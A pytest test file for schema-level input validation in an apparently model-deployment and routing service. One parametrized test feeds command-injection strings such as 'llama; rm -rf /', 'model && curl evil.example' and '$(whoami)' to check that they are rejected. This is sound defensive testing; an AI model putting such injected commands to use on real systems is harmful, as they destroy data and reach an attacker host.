"""Input validation at the schema boundary.

These are the checks that keep untrusted input from reaching Docker, the
gateway config, or the database (Decision Framework 3: never trust external
input).
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from app.models.enums import DeploymentBackend, ProviderType, RoutingStrategy
from app.schemas.deployment import DeploymentCreate
from app.schemas.playground import PlaygroundCompareRequest
from app.schemas.provider import ProviderCreate
from app.schemas.routing import RoutingPolicyCreate
from app.schemas.tenancy import ProjectCreate


class TestDeploymentCreate:
    @pytest.mark.parametrize(
        "model_ref",
        [
            "llama3.1:8b",
            "meta-llama/Llama-3.1-8B-Instruct",
            "mistral:7b-instruct-q4_0",
        ],
    )
    def test_accepts_real_model_references(self, model_ref: str) -> None:
        payload = DeploymentCreate(
            backend_type=DeploymentBackend.OLLAMA, model_ref=model_ref
        )
        assert payload.model_ref == model_ref

    @pytest.mark.parametrize(
        "model_ref",
        [
            "llama; rm -rf /",
            "model && curl evil.example",
            "--privileged",
            "$(whoami)",
            "model`id`",
            "model|tee",
        ],
    )
    def test_rejects_shell_and_flag_metacharacters(self, model_ref: str) -> None:
        """`model_ref` is passed as an argument to an allow-listed image; a
        leading `-` or a shell metacharacter has no legitimate use here."""
        with pytest.raises(ValidationError):
            DeploymentCreate(backend_type=DeploymentBackend.VLLM, model_ref=model_ref)

    def test_rejects_an_out_of_range_gpu_index(self) -> None:
        with pytest.raises(ValidationError):
            DeploymentCreate(
                backend_type=DeploymentBackend.VLLM, model_ref="m", gpu_index=-1
            )


class TestRoutingPolicyCreate:
    def test_weighted_requires_weights(self) -> None:
        with pytest.raises(ValidationError, match="weights"):
            RoutingPolicyCreate(
                name="p",
                strategy=RoutingStrategy.WEIGHTED,
                config={},
                model_allowlist=["a"],
            )

    def test_weights_must_reference_allowlisted_models(self) -> None:
        with pytest.raises(ValidationError, match="outside model_allowlist"):
            RoutingPolicyCreate(
                name="p",
                strategy=RoutingStrategy.WEIGHTED,
                config={"weights": {"b": 1}},
                model_allowlist=["a"],
            )

    def test_fallback_needs_at_least_two_models_in_order(self) -> None:
        with pytest.raises(ValidationError, match="at least two"):
            RoutingPolicyCreate(
                name="p",
                strategy=RoutingStrategy.FALLBACK,
                config={"fallback_order": ["a"]},
                model_allowlist=["a", "b"],
            )

    def test_cost_threshold_requires_its_threshold(self) -> None:
        with pytest.raises(ValidationError, match="max_cost_per_1k_tokens_usd"):
            RoutingPolicyCreate(
                name="p",
                strategy=RoutingStrategy.COST_THRESHOLD,
                config={},
                model_allowlist=["a"],
            )

    def test_a_valid_policy_passes(self) -> None:
        policy = RoutingPolicyCreate(
            name="cost-optimized-default",
            strategy=RoutingStrategy.COST_THRESHOLD,
            config={
                "max_cost_per_1k_tokens_usd": 0.01,
                "fallback_model_id": "gpt-4o-mini",
            },
            model_allowlist=["gpt-4o-mini", "claude-haiku-4-5"],
        )
        assert policy.strategy is RoutingStrategy.COST_THRESHOLD

    def test_an_empty_allowlist_is_rejected(self) -> None:
        with pytest.raises(ValidationError):
            RoutingPolicyCreate(
                name="p",
                strategy=RoutingStrategy.CHEAPEST,
                config={},
                model_allowlist=[],
            )

    def test_phase2_strategies_are_not_selectable(self) -> None:
        """`custom_python` / `ai_router` are Phase 2+ and deliberately absent
        from the enum — an API that accepts them would be promising behaviour
        that does not exist."""
        with pytest.raises(ValidationError):
            RoutingPolicyCreate(
                name="p",
                strategy="custom_python",  # type: ignore[arg-type]
                config={},
                model_allowlist=["a"],
            )


class TestProviderCreate:
    def test_cloud_provider_requires_an_api_key(self) -> None:
        with pytest.raises(ValidationError, match="api_key is required"):
            ProviderCreate(provider_type=ProviderType.OPENAI, display_name="OpenAI")

    def test_local_provider_requires_a_base_url_not_a_key(self) -> None:
        with pytest.raises(ValidationError, match="base_url is required"):
            ProviderCreate(provider_type=ProviderType.OLLAMA, display_name="Local")

        provider = ProviderCreate(
            provider_type=ProviderType.OLLAMA,
            display_name="Local",
            base_url="http://localhost:11434",
        )
        assert provider.api_key is None

    def test_api_key_is_excluded_from_repr(self) -> None:
        """Guards against a credential landing in a log line via an f-string of
        the model (Article XII)."""
        provider = ProviderCreate(
            provider_type=ProviderType.OPENAI,
            display_name="OpenAI",
            api_key="sk-secret",
        )
        assert "sk-secret" not in repr(provider)


class TestPlaygroundCompareRequest:
    def test_requires_at_least_two_models(self) -> None:
        with pytest.raises(ValidationError):
            PlaygroundCompareRequest(prompt="hi", model_ids=["only-one"])

    def test_rejects_duplicate_models(self) -> None:
        with pytest.raises(ValidationError, match="unique"):
            PlaygroundCompareRequest(prompt="hi", model_ids=["a", "a"])

    def test_temperature_bounds(self) -> None:
        with pytest.raises(ValidationError):
            PlaygroundCompareRequest(prompt="hi", model_ids=["a", "b"], temperature=3.0)


class TestProjectCreate:
    @pytest.mark.parametrize("slug", ["my-project", "abc", "a1-b2-c3"])
    def test_accepts_valid_slugs(self, slug: str) -> None:
        assert ProjectCreate(name="n", slug=slug).slug == slug

    @pytest.mark.parametrize("slug", ["My Project", "trailing-", "--double", "sl/ash"])
    def test_rejects_invalid_slugs(self, slug: str) -> None:
        with pytest.raises(ValidationError):
            ProjectCreate(name="n", slug=slug)
